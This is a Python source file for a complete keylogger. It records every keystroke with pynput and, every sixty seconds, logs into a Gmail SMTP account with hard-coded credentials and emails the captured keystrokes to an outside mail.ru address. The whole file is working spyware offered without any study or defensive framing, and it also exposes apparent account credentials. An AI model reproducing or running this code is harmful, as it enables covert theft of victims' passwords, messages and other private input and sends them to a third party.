import pynput.keyboard
import threading
import smtplib
from email.message import EmailMessage
import subprocess


log = ""

class Keylogger:

	def press(self, key):
			global log
			try:
				log = log + str(key.char)
			except AttributeError:
				if key == key.space:
					log = log + " "
				elif key == key.tab:
					log = log +" "
				elif key == key.backspace:
					log = log + " <= "
				elif key == key.alt_l:
					log = log + " "
				elif key == key.shift_l:
					log = log + " "
				elif key == key.caps_lock:
					log = log + " "
				elif key == key.enter:
					log = log + " ENTER "
				elif key == key.shift_r:
					log = log + " "
				elif key == key.esc:
					log = log + " "
				elif key == key.cmd:
					log = log + " "
				elif key == key.alt_gr:
					log = log + " "
				elif key == key.ctrl_l:
					log = log + " "
				elif key == key.ctrl_r:
					log = log + " "
				else:
					log = log + " " + str(key) + " "

	def report(self):
		global log 
		self.send_mail()
		log = ""
		timer = threading.Timer(60, self.report)
		timer.start()

	def send_mail(self):
		server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
		sender = 'saadaouiismailmed@gmail.com'
		server.login(sender, '##RUHACK313##')
		msg = EmailMessage()
		msg['From'] = sender
		msg['To'] = "kimanxo@mail.ru"
		msg['Subject'] = "LOGS"
		body = (log)
		msg.set_content(body)
		server.send_message(msg)
		server.quit()

	def start(self):
		Listener = pynput.keyboard.Listener(on_press = self.press) 
		with Listener:
			self.report()
			Listener.join()

XLogger = Keylogger()
XLogger.start()
			  

